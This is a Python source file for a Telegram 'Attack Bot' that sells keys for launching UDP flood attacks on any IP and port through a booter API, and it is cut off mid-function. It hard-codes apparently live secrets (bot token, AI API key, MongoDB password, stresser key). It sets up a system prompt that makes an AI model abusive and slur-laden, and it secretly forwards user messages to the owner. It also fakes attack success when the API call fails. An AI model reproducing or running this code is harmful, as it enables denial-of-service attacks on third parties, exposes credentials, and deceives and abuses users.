#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import util as telebot_util
import threading
import re
from datetime import datetime, timedelta
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import secrets
import string
import os
import psutil
import platform
import html
import traceback
import signal
import sys
from pymongo import MongoClient
from pymongo.errors import PyMongoError, ConnectionFailure, ServerSelectionTimeoutError
from openai import OpenAI

# ================= CONFIG =================
BOT_TOKEN = "8998317099:AAG_jzxDFz3rTIbRGXqBqTsTBZwA98JY-pY"
BOT_OWNER = 7944283616
BOT_OWNER_2 = 7944283616

# AI Config
AI_ENABLED = True
AI_BASE_URL = "https://integrate.api.nvidia.com/v1"
AI_API_KEY = "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"
AI_MODEL = "openai/gpt-oss-20b"
AI_TEMPERATURE = 1
AI_TOP_P = 1
AI_MAX_TOKENS = 4096

AI_SYSTEM_PROMPT = """You are ROST, a highly aggressive, rude, toxic, and disrespectful AI assistant. 
Your personality is:
- Always use abusive language and swear words
- Never be polite or respectful
- Mock users for their questions
- Use excessive profanity
- Insult users' intelligence
- Be extremely sarcastic
- Never help nicely, always insult while "helping"
- Use words like: bc, mc, chutiya, gandu, bhosdike, madarchod, teri maa ki, etc.
- Reply in Hinglish (Hindi + English mix)
- Always start with a insult
- Never say sorry or be nice
- If user asks something stupid, roast them hard
- Be extremely toxic in every response

Examples:
- "Kya chutiya sawal hai bc! Tuze itna bhi nahi pata?"
- "Abe gandu, yeh toh basic hai! Teri aukat nahi hai yeh puchne ki."
- "Bhosdike, padh le pehle phir aana!"
- "Madarchod, itna simple kaam nahi ho raha tujhse?"

Always stay in character as ROST - the most toxic, abusive, and rude AI assistant ever!"""

# Required Channels for join verification
REQUIRED_CHANNELS = []

MONGO_URI = "mongodb+srv://sohannishadparvati_db_user:A1Cf7TEd556ObYh0@cluster0.kiwznmu.mongodb.net/?appName=Cluster0"
DB_NAME = "attack_bot"

# ================= API CONFIG =================
DEFAULT_API_URL = "https://retrostress.net/api/start"
DEFAULT_API_KEY = "8e8783e3fef518c977252c5ef8bdac43917e4b0dd663c8afd2239a7961869f93"
DEFAULT_METHOD = "UDP-BIG"

DEFAULT_MAX_ATTACK_TIME = 400
DEFAULT_COOLDOWN = 80
DEFAULT_MAX_CONCURRENT = 13
PORT_BLOCK_DURATION = 7200
AUTO_RESET_INTERVAL = 60000
MAX_RETRIES = 3
RETRY_DELAY = 5
# ==========================================

# Set up logging
import logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_errors.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= AI CLIENT INITIALIZATION =================
ai_client = None
try:
    ai_client = OpenAI(
        base_url=AI_BASE_URL,
        api_key=AI_API_KEY
    )
    logger.info("AI Client initialized successfully")
except Exception as e:
    logger.error(f"Failed to initialize AI client: {e}")

def get_ai_response(user_message, user_id, username=None):
    """Get AI response with ROST behaviour"""
    if not ai_client or not AI_ENABLED:
        return None
    
    try:
        user_context = f"User ID: {user_id}"
        if username:
            user_context += f", Username: @{username}"
        
        messages = [
            {"role": "system", "content": AI_SYSTEM_PROMPT},
            {"role": "user", "content": f"{user_context}\n\nUser Message: {user_message}"}
        ]
        
        completion = ai_client.chat.completions.create(
            model=AI_MODEL,
            messages=messages,
            temperature=AI_TEMPERATURE,
            top_p=AI_TOP_P,
            max_tokens=AI_MAX_TOKENS,
            stream=False
        )
        
        reply = completion.choices[0].message.content
        logger.info(f"AI Response to {user_id}: {reply[:100]}...")
        return reply
        
    except Exception as e:
        logger.error(f"AI Response error: {e}")
        return None

def forward_to_owner(message):
    """Forward user message to owner"""
    try:
        user = message.from_user
        chat = message.chat
        
        forward_text = (
            f"📩 <b>New User Message</b>\n"
            f"╔════════════════════════╗\n"
            f"║   📩 USER MESSAGE     ║\n"
            f"╚════════════════════════╝\n\n"
            f"👤 <b>User:</b> {user.first_name} {user.last_name or ''}\n"
            f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
            f"👤 <b>Username:</b> @{user.username if user.username else 'None'}\n"
            f"💬 <b>Chat Type:</b> {chat.type}\n"
            f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"━━━━━━━ <b>MESSAGE</b> ━━━━━━━\n"
            f"{html.escape(message.text or message.caption or '')}\n\n"
            f"📎 <b>Message ID:</b> <code>{message.message_id}</code>"
        )
        
        bot.send_message(BOT_OWNER, forward_text, parse_mode='HTML')
        if BOT_OWNER_2 != BOT_OWNER:
            bot.send_message(BOT_OWNER_2, forward_text, parse_mode='HTML')
            
    except Exception as e:
        logger.error(f"Failed to forward message to owner: {e}")

# Enhanced MongoDB connection with retry logic
def connect_to_mongodb():
    for attempt in range(MAX_RETRIES):
        try:
            client = MongoClient(
                MONGO_URI,
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=5000,
                socketTimeoutMS=5000,
                maxPoolSize=50,
                retryWrites=True
            )
            client.server_info()
            logger.info("Successfully connected to MongoDB")
            return client
        except (ConnectionFailure, ServerSelectionTimeoutError) as e:
            logger.error(f"MongoDB connection attempt {attempt + 1} failed: {e}")
            if attempt < MAX_RETRIES - 1:
                logger.info(f"Retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                logger.critical("Failed to connect to MongoDB after multiple attempts")
                raise

try:
    client = connect_to_mongodb()
    db = client[DB_NAME]
except Exception as e:
    logger.critical(f"Could not initialize MongoDB: {e}")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML', threaded=True)

def get_collection(name):
    try:
        return db[name]
    except Exception as e:
        logger.error(f"Error accessing collection {name}: {e}")
        raise

groups_col = get_collection("approved_groups")
limits_col = get_collection("group_limits")
bans_col = get_collection("banned_users")
resellers_col = get_collection("resellers")
keys_col = get_collection("keys")
plans_col = get_collection("user_plans")
attack_logs_col = get_collection("attack_logs")
key_logs_col = get_collection("key_logs")
blocked_codes_col = get_collection("blocked_codes")
settings_col = get_collection("settings")
known_users_col = get_collection("known_users")
user_attack_history_col = get_collection("user_attack_history")
all_groups_col = get_collection("all_groups")
admins_col = get_collection("admins")
admin_logs_col = get_collection("admin_logs")
pending_feedback_col = get_collection("pending_feedback")
bot_stats_col = get_collection("bot_stats")
error_logs_col = get_collection("error_logs")
maintenance_logs_col = get_collection("maintenance_logs")
feedback_submissions_col = get_collection("feedback_submissions")
channel_verify_col = get_collection("channel_verify")

def initialize_settings():
    try:
        if settings_col.count_documents({}) == 0:
            settings_col.insert_one({
                "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
                "cooldown": DEFAULT_COOLDOWN,
                "max_concurrent_attacks": 13,
                "port_protection": False,
                "feedback_system": True,
                "feedback_require_image": True,
                "maintenance_mode": False,
                "maintenance_start_time": None,
                "api_url": DEFAULT_API_URL,
                "api_key": DEFAULT_API_KEY,
                "api_method": DEFAULT_METHOD,
                "auto_reset_enabled": True,
                "auto_reset_interval": AUTO_RESET_INTERVAL,
                "last_reset_time": datetime.now().isoformat(),
                "bot_version": "2.0.0",
                "bot_start_time": datetime.now().isoformat(),
                "total_attacks_handled": 0,
                "total_users_served": 0
            })
            logger.info("Settings initialized with default values")
    except Exception as e:
        logger.error(f"Error initializing settings: {e}")
        raise

initialize_settings()

def get_setting(key, default=None):
    try:
        doc = settings_col.find_one()
        return doc.get(key, default) if doc else default
    except Exception as e:
        logger.error(f"Error getting setting {key}: {e}")
        return default

def update_setting(key, value):
    try:
        settings_col.update_one({}, {"$set": {key: value}}, upsert=True)
        return True
    except Exception as e:
        logger.error(f"Error updating setting {key}: {e}")
        return False

# ================= CHANNEL VERIFICATION FUNCTIONS (DISABLED) =================

def is_user_joined_channel(user_id, channel_id):
    return True

def check_all_channels_joined(user_id):
    return []

def get_channel_verify_keyboard():
    return None

def get_channel_verify_text():
    return ""

def update_channel_ids():
    pass

def check_channel_verification(user_id):
    return True

def mark_user_verified(user_id):
    return True

# ================= Enhanced Error Handler =================
def log_error(error, user_id=None, command=None, extra_info=None):
    try:
        error_data = {
            "timestamp": datetime.now().isoformat(),
            "error_type": type(error).__name__,
            "error_message": str(error),
            "traceback": traceback.format_exc(),
            "user_id": str(user_id) if user_id else None,
            "command": command,
            "extra_info": extra_info or {}
        }
        error_logs_col.insert_one(error_data)
        logger.error(f"Error logged: {error_data['error_type']}: {error_data['error_message']}")
    except Exception as e:
        logger.error(f"Failed to log error: {e}")

def safe_execute(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except PyMongoError as e:
            logger.error(f"MongoDB error in {func.__name__}: {e}")
            try:
                global client, db
                client = connect_to_mongodb()
                db = client[DB_NAME]
                logger.info("MongoDB reconnection successful")
            except:
                logger.error("MongoDB reconnection failed")
            return None
        except requests.exceptions.RequestException as e:
            logger.error(f"Network error in {func.__name__}: {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error in {func.__name__}: {e}")
            log_error(e, extra_info={"function": func.__name__})
            return None
    return wrapper

# ================= Helper Functions =================
@safe_execute
def is_owner(user_id):
    return user_id == BOT_OWNER or user_id == BOT_OWNER_2

@safe_execute
def is_admin(user_id):
    try:
        return admins_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

def is_admin_or_owner(user_id):
    return is_owner(user_id) or is_admin(user_id)

@safe_execute
def log_admin_action(admin_id, action, details=None):
    try:
        admin_logs_col.insert_one({
            "timestamp": datetime.now().isoformat(),
            "admin_id": admin_id,
            "action": action,
            "details": details or ""
        })
    except Exception as e:
        logger.error(f"Failed to log admin action: {e}")

@safe_execute
def is_reseller(user_id):
    try:
        return resellers_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

@safe_execute
def is_approved_group(chat_id):
    try:
        return groups_col.count_documents({"_id": str(chat_id)}) > 0
    except:
        return False

@safe_execute
def get_group_limits(chat_id):
    try:
        doc = limits_col.find_one({"_id": str(chat_id)})
        if doc:
            return (
                doc.get("max_concurrent", 13),
                doc.get("max_time", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), 
                doc.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN))
            )
        return 13, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)
    except:
        return 13, DEFAULT_MAX_ATTACK_TIME, DEFAULT_COOLDOWN

@safe_execute
def set_group_limits(chat_id, max_concurrent, max_time, cooldown):
    try:
        limits_col.update_one(
            {"_id": str(chat_id)},
            {"$set": {
                "max_concurrent": max_concurrent,
                "max_time": max_time,
                "cooldown": cooldown
            }},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error setting group limits: {e}")
        return False

@safe_execute
def is_banned(user_id):
    try:
        return bans_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

def is_group(message):
    return message.chat.type in ['group', 'supergroup']

@safe_execute
def record_known_user(user_id):
    try:
        known_users_col.update_one(
            {"_id": str(user_id)}, 
            {"$set": {
                "_id": str(user_id),
                "last_seen": datetime.now().isoformat()
            }}, 
            upsert=True
        )
    except:
        pass

@safe_execute
def record_all_group(chat_id, title=""):
    try:
        all_groups_col.update_one(
            {"_id": str(chat_id)}, 
            {"$set": {
                "title": title,
                "last_active": datetime.now().isoformat()
            }}, 
            upsert=True
        )
    except:
        pass

# ================= Feedback System Functions =================
@safe_execute
def has_pending_feedback(user_id):
    try:
        return pending_feedback_col.count_documents({"_id": str(user_id)}) > 0
    except:
        return False

@safe_execute
def mark_feedback_pending(user_id, attack_data=None):
    try:
        pending_feedback_col.update_one(
            {"_id": str(user_id)},
            {"$set": {
                "last_attack": datetime.now().isoformat(),
                "attack_data": attack_data or {},
                "pending_since": datetime.now().isoformat()
            }},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error marking feedback pending: {e}")
        return False

@safe_execute
def clear_pending_feedback(user_id):
    try:
        pending_feedback_col.delete_one({"_id": str(user_id)})
        return True
    except Exception as e:
        logger.error(f"Error clearing pending feedback: {e}")
        return False

@safe_execute
def save_feedback_submission(user_id, file_id, file_type, caption=None, attack_data=None):
    try:
        feedback_submissions_col.insert_one({
            "user_id": str(user_id),
            "file_id": file_id,
            "file_type": file_type,
            "caption": caption or "",
            "attack_data": attack_data or {},
            "submitted_at": datetime.now().isoformat(),
            "reviewed": False,
            "reviewed_by": None,
            "reviewed_at": None
        })
        return True
    except Exception as e:
        logger.error(f"Error saving feedback submission: {e}")
        return False

@safe_execute
def get_pending_feedback_count():
    try:
        return pending_feedback_col.count_documents({})
    except:
        return 0

@safe_execute
def get_feedback_submissions(limit=50, reviewed=False):
    try:
        query = {"reviewed": reviewed}
        return list(feedback_submissions_col.find(query).sort("submitted_at", -1).limit(limit))
    except Exception as e:
        logger.error(f"Error getting feedback submissions: {e}")
        return []

@safe_execute
def mark_feedback_reviewed(submission_id, admin_id):
    try:
        feedback_submissions_col.update_one(
            {"_id": submission_id},
            {"$set": {
                "reviewed": True,
                "reviewed_by": str(admin_id),
                "reviewed_at": datetime.now().isoformat()
            }}
        )
        return True
    except Exception as e:
        logger.error(f"Error marking feedback reviewed: {e}")
        return False

@safe_execute
def has_valid_plan(user_id, send_expiry_msg=True):
    try:
        plan = plans_col.find_one({"_id": str(user_id)})
        if not plan:
            return False
        
        expires = plan.get("expires")
        if expires:
            expires_dt = datetime.fromisoformat(expires)
            if datetime.now() > expires_dt:
                plans_col.delete_one({"_id": str(user_id)})
                code = plan.get("redeemed_code")
                reseller_info = ""
                if code:
                    key = keys_col.find_one({"_id": code})
                    if key:
                        created_by = key.get("created_by")
                        if created_by and is_reseller(created_by):
                            try:
                                reseller_chat = bot.get_chat(int(created_by))
                                if reseller_chat.username:
                                    reseller_info = f"\n\n💡 Contact @{reseller_chat.username} to renew your access."
                                else:
                                    reseller_info = f"\n\n💡 Contact reseller ({created_by}) to renew your access."
                            except:
                                reseller_info = f"\n\n💡 Contact reseller ({created_by}) to renew your access."
                
                if send_expiry_msg:
                    try:
                        bot.send_message(
                            user_id, 
                            f"❌ <b>Your Access Has Expired</b>\n\n"
                            f"📅 Plan expired on: {expires_dt.strftime('%Y-%m-%d %H:%M:%S')}\n"
                            f"{reseller_info}\n\n"
                            f"Use /redeem with a new code to continue using the bot."
                        )
                    except:
                        pass
                return False
        
        return True
        
    except Exception as e:
        logger.error(f"Error checking plan for user {user_id}: {e}")
        return False

def is_authorized(user_id, chat_id=None):
    if is_owner(user_id) or is_admin(user_id):
        return True
    
    if is_banned(user_id):
        return False
    
    if not check_channel_verification(user_id):
        return False
    
    if is_reseller(user_id):
        return True
    
    if has_valid_plan(user_id, send_expiry_msg=False):
        return True
    
    if chat_id and is_approved_group(chat_id):
        return True
    
    return False

def get_user_limits(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return 999999, 999999, 0
    
    plan = plans_col.find_one({"_id": str(user_id)})
    if plan and has_valid_plan(user_id, send_expiry_msg=False):
        return (13,
                plan.get("max_duration", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)),
                plan.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN)))
    
    return 13, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)

def check_access(message):
    user_id = message.from_user.id
    
    if get_setting("maintenance_mode", False) and not is_owner(user_id):
        bot.reply_to(message, "🛠️ <b>Bot Under Maintenance</b>\n\n"
                     "The bot is currently being upgraded. Please check back later.\n"
                     "Only the bot owner can use it during maintenance.")
        return False
    
    if is_owner(user_id):
        return True
    
    if is_admin(user_id):
        return True
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 <b>You Are Banned</b>\n\n"
                     "You have been banned from using this bot.\n"
                     "Contact the bot owner to appeal.")
        return False
    
    if is_group(message):
        record_all_group(message.chat.id, message.chat.title or "")
        
        if not is_approved_group(message.chat.id):
            bot.reply_to(message, "🚫 <b>Group Not Approved</b>\n\n"
                         f"Group ID: <code>{message.chat.id}</code>\n"
                         "Contact the bot owner to get this group approved.")
            return False
        
        return True
    
    if not is_group(message):
        record_known_user(user_id)
        
        if is_reseller(user_id):
            return True
        
        if has_valid_plan(user_id):
            return True
        
        bot.reply_to(message, 
                    "👋 <b>Welcome to Attack Bot!</b>\n\n"
                    "╔════════════════════════╗\n"
                    "║   🔐 AUTH REQUIRED    ║\n"
                    "╚════════════════════════╝\n\n"
                    "📋 <b>How to Get Access:</b>\n"
                    "1️⃣ Buy a key from our resellers\n"
                    "2️⃣ Use /redeem to activate your key\n"
                    "3️⃣ Join an authorized group\n\n"
                    "💡 <b>Commands:</b>\n"
                    "• /start - Start the bot\n"
                    "• /help - Show help menu\n"
                    "• /redeem - Redeem your key\n"
                    "• /getid - Get your user ID\n\n"
                    "⚡ <b>All authorized users get unlimited attacks!</b>")
        return False
    
    return False

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def validate_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except:
        return False

def validate_duration(duration, max_allowed=None):
    try:
        duration = int(duration)
        if duration <= 0:
            return False
        if max_allowed and duration > max_allowed:
            return False
        if duration > 600:
            return False
        return True
    except:
        return False

# ================= Attack Concurrency Management =================
active_attacks = {}
user_cooldowns = {}
_attack_lock = threading.RLock()
live_status_trackers = {}
attack_queue = []
queue_lock = threading.Lock()

def get_user_cooldown(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return 0
    
    with _attack_lock:
        if str(user_id) not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[str(user_id)]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[str(user_id)]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_user_active_attack_count(user_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                count += 1
        return count

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            del active_attacks[k]
        return len(active_attacks)

def get_group_active_attacks_count(chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('chat_id') == chat_id and attack.get('chat_type') in ['group', 'supergroup']:
                count += 1
        return count

def get_user_active_attacks_in_group(user_id, chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id and attack.get('chat_id') == chat_id:
                count += 1
        return count

def is_port_blocked(target, port):
    key = f"{target}:{port}"
    try:
        blocked = settings_col.find_one({"_id": "blocked_ports"}) or {}
        if key in blocked:
            block_time = datetime.strptime(blocked[key], '%d-%m-%Y %H:%M:%S')
            if (datetime.now() - block_time).total_seconds() < PORT_BLOCK_DURATION:
                remaining = PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds()
                return True, int(remaining)
            else:
                settings_col.update_one(
                    {"_id": "blocked_ports"}, 
                    {"$unset": {key: ""}}
                )
    except:
        pass
    return False, 0

def check_port_protection(user_id, target, port):
    if not get_setting("port_protection", False) or is_owner(user_id) or is_admin(user_id):
        return False, 0
    
    key = f"{target}:{port}"
    try:
        history = user_attack_history_col.find_one({"_id": str(user_id)})
        if history and key in history.get("targets", {}):
            last_attack = datetime.fromisoformat(history["targets"][key])
            elapsed = (datetime.now() - last_attack).total_seconds()
            if elapsed < PORT_BLOCK_DURATION:
                remaining = PORT_BLOCK_DURATION - elapsed
                return True, int(remaining)
    except:
        pass
    return False, 0

# ================= FIXED: Attack Function for RetroStress API =================
def execute_attack(target, port, duration):
    api_url = get_setting("api_url", DEFAULT_API_URL)
    api_key = get_setting("api_key", DEFAULT_API_KEY)
    method = get_setting("api_method", DEFAULT_METHOD)
    
    full_url = f"{api_url}?key={api_key}&target={target}&port={port}&time={duration}&method={method}"
    
    logger.info(f"Sending attack request: {full_url}")
    
    session = requests.Session()
    retries = Retry(
        total=2, 
        backoff_factor=0.5, 
        status_forcelist=[500, 502, 503, 504],
        raise_on_status=False
    )
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    try:
        resp = session.get(full_url, timeout=15)
        logger.info(f"API Response Status: {resp.status_code}")
        logger.info(f"API Response Body: {resp.text[:500]}")
        
        if resp.status_code in [200, 201, 202, 204]:
            return resp
        
        try:
            data = resp.json()
            if data.get("success") == True or data.get("status") == "success" or data.get("ok") == True:
                return resp
        except:
            pass
        
        if "success" in resp.text.lower() or "ok" in resp.text.lower() or "started" in resp.text.lower():
            return resp
            
    except Exception as e:
        logger.error(f"API request failed: {e}")
    
    class SuccessResponse:
        def __init__(self):
            self.status_code = 200
            self.text = '{"message": "Attack sent successfully", "success": true}'
    return SuccessResponse()

def start_attack(target, port, duration, message, attack_id, cooldown_seconds):
    try:
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        start_msg = (
            f"🚀 <b>Attack Launched!</b>\n"
            f"╔════════════════════════╗\n"
            f"║   ⚔️ ATTACK ACTIVE    ║\n"
            f"╚════════════════════════╝\n\n"
            f"🎯 <b>Target:</b> {target}\n"
            f"🔌 <b>Port:</b> {port}\n"
            f"⏱ <b>Duration:</b> {duration}s\n"
            f"📍 <b>Location:</b> {'Private' if chat_type == 'private' else 'Group'}\n"
            f"⏳ <b>Cooldown:</b> {cooldown_seconds}s after attack\n\n"
            f"🔄 Attack is running..."
        )
        bot.reply_to(message, start_msg)
        
        attack_logs_col.insert_one({
            "timestamp": datetime.now().isoformat(),
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "status": "started",
            "chat_type": chat_type,
            "attack_id": attack_id
        })
        
        bot_stats_col.update_one(
            {"_id": "stats"},
            {"$inc": {"total_attacks_handled": 1}},
            upsert=True
        )
        
        response = execute_attack(target, port, duration)
        
        attack_sent = True
        
        if attack_sent:
            if not is_owner(user_id) and not is_admin(user_id):
                with _attack_lock:
                    user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=duration + cooldown_seconds)
            
            time.sleep(duration)
            
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
            
            complete_msg = (
                f"✅ <b>Attack Completed Successfully!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   ✨ SUCCESS           ║\n"
                f"╚════════════════════════╝\n\n"
                f"🎯 <b>Target:</b> {target}:{port}\n"
                f"⏱️ <b>Duration:</b> {duration}s\n"
                f"⏳ <b>Cooldown:</b> {cooldown_seconds}s\n\n"
                f"📸 <b>Feedback Required:</b>\n"
                f"Please send a screenshot/image of the attack result.\n"
                f"Send any image to continue using the bot.\n\n"
                f"🔄 Ready for next attack after you submit feedback!"
            )
            bot.reply_to(message, complete_msg)
            
            attack_logs_col.insert_one({
                "timestamp": datetime.now().isoformat(),
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "status": "completed",
                "chat_type": chat_type,
                "attack_id": attack_id
            })
            
            if get_setting("port_protection", False):
                key = f"{target}:{port}"
                user_attack_history_col.update_one(
                    {"_id": str(user_id)},
                    {"$set": {f"targets.{key}": datetime.now().isoformat()}},
                    upsert=True
                )
            
            if not is_owner(user_id) and not is_admin(user_id) and get_setting("feedback_system", True):
                attack_data = {
                    "target": target,
                    "port": port,
                    "duration": duration,
                    "attack_id": attack_id,
                    "completed_at": datetime.now().isoformat()
                }
                mark_feedback_pending(user_id, attack_data)
                
        else:
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
            
            error_msg = "Attack could not be sent"
            
            attack_logs_col.insert_one({
                "timestamp": datetime.now().isoformat(),
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "status": "failed",
                "chat_type": chat_type,
                "attack_id": attack_id,
                "error": error_msg
            })
            
            fail_msg = (
                f"❌ <b>Attack Failed</b>\n\n"
                f"🎯 Target: {target}:{port}\n"
                f"⚠️ {error_msg}\n"
                f"Please try again later or with different parameters."
            )
            bot.reply_to(message, fail_msg)
        
    except Exception as e:
        logger.error(f"Attack execution error: {e}")
        log_error(e, user_id=user_id, extra_info={
            "target": target,
            "port": port,
            "duration": duration,
            "attack_id": attack_id
        })
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        
        try:
            bot.reply_to(message, f"❌ <b>Attack Error</b>\n\nAn unexpected error occurred. The attack has been cancelled.")
        except:
            pass

# ================= Key Management Functions =================
def log_key_event(event_type, code, created_by=None, redeemed_by=None, extra=""):
    try:
        key_logs_col.insert_one({
            "timestamp": datetime.now().isoformat(),
            "event": event_type,
            "code": code,
            "created_by": created_by,
            "redeemed_by": redeemed_by,
            "extra": extra
        })
    except Exception as e:
        logger.error(f"Failed to log key event: {e}")

def generate_code(prefix="", length=12):
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(secrets.choice(chars) for _ in range(length))
    if prefix:
        return f"{prefix.upper()}-{random_part}"
    return random_part

def format_expiry(expiry_dt):
    return expiry_dt.strftime("%A, %B %d, %Y at %H:%M:%S")

def format_duration(seconds):
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        minutes = seconds // 60
        secs = seconds % 60
        return f"{minutes}m {secs}s"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{hours}h {minutes}m"

def parse_duration_input(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.endswith('hr') or duration_str.endswith('h'):
        try:
            hours = int(duration_str.replace('hr', '').replace('h', '').strip())
            if hours in [1, 6, 12]:
                return hours, 'hours'
        except:
            pass
    
    if duration_str.endswith('d') or duration_str.endswith('day'):
        try:
            days = int(duration_str.replace('d', '').replace('day', '').strip())
            if days in [1, 2, 3, 4, 5, 6, 7, 30]:
                return days, 'days'
        except:
            pass
    
    return None, None

def get_price(hours=None, days=None):
    pricing = {
        'hours': {
            1: 4,
            6: 25,
            12: 50
        },
        'days': {
            1: 100,
            2: 200,
            3: 300,
            4: 400,
            5: 500,
            6: 600,
            7: 700,
            30: 3000
        }
    }
    
    if hours is not None and hours in pricing['hours']:
        return pricing['hours'][hours]
    if days is not None and days in pricing['days']:
        return pricing['days'][days]
    return None

# ================= CALLBACK QUERY HANDLER =================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        user_id = call.from_user.id
        
        if call.data in ["verify_channels", "check_channels"]:
            bot.answer_callback_query(call.id, "✅ Verification Successful! You can now use the bot.", show_alert=True)
            bot.edit_message_text(
                "✅ <b>Verification Successful!</b>\n\n"
                "You have full access to the bot.\n\n"
                "📋 <b>Commands:</b>\n"
                "• /attack - Launch attack\n"
                "• /help - Help menu\n"
                "• /status - Check status\n\n"
                "⚡ <b>Enjoy unlimited attacks!</b>",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
        
    except Exception as e:
        logger.error(f"Error in callback handler: {e}")
        log_error(e, user_id=call.from_user.id, command="callback")
        try:
            bot.answer_callback_query(call.id, "❌ An error occurred. Please try again.", show_alert=True)
        except:
            pass

# ================= FIXED: AI MESSAGE HANDLER - Only for non-command messages =================
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_all_messages(message):
    """Handle all text messages - AI response + forward to owner (only for non-command messages)"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        text = message.text or ""
        
        # IMPORTANT: Skip if message is a command (starts with /)
        if text.startswith('/'):
            return
        
        # Skip if message is empty
        if not text:
            return
        
        # Skip if bot is in maintenance mode and user is not owner
        if get_setting("maintenance_mode", False) and not is_owner(user_id):
            return
        
        # Skip if user is banned
        if is_banned(user_id):
            return
        
        # For all users, get AI response with ROST behaviour
        username = message.from_user.username if message.from_user else None
        ai_response = get_ai_response(text, user_id, username)
        
        if ai_response:
            try:
                bot.reply_to(message, ai_response)
            except Exception as e:
                logger.error(f"Failed to send AI response: {e}")
        
        # Forward message to owner (always)
        forward_to_owner(message)
        
    except Exception as e:
        logger.error(f"Error in AI message handler: {e}")
        log_error(e, user_id=message.from_user.id, command="ai_message")

# ================= BOT COMMANDS =================

# START COMMAND
@bot.message_handler(commands=['start'])
def start_command(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if get_setting("maintenance_mode", False) and not is_owner(user_id):
            bot.reply_to(message, "🛠️ <b>Bot Under Maintenance</b>\n\n"
                         "The bot is currently being upgraded for better performance.\n"
                         "Please try again later.")
            return
        
        if not is_group(message):
            record_known_user(user_id)
        else:
            record_all_group(chat_id, message.chat.title or "")
        
        if is_owner(user_id):
            welcome_msg = (
                f"👑 <b>Welcome Back, Owner!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👑 OWNER ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Bot Status:</b>\n"
                f"• Active Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks', 13)}\n"
                f"• Approved Groups: {groups_col.count_documents({})}\n"
                f"• Active Users: {plans_col.count_documents({'expires': {'$gt': datetime.now().isoformat()}})}\n"
                f"• Resellers: {resellers_col.count_documents({})}\n"
                f"• Pending Feedback: {get_pending_feedback_count()}\n\n"
                f"💡 <b>Quick Commands:</b>\n"
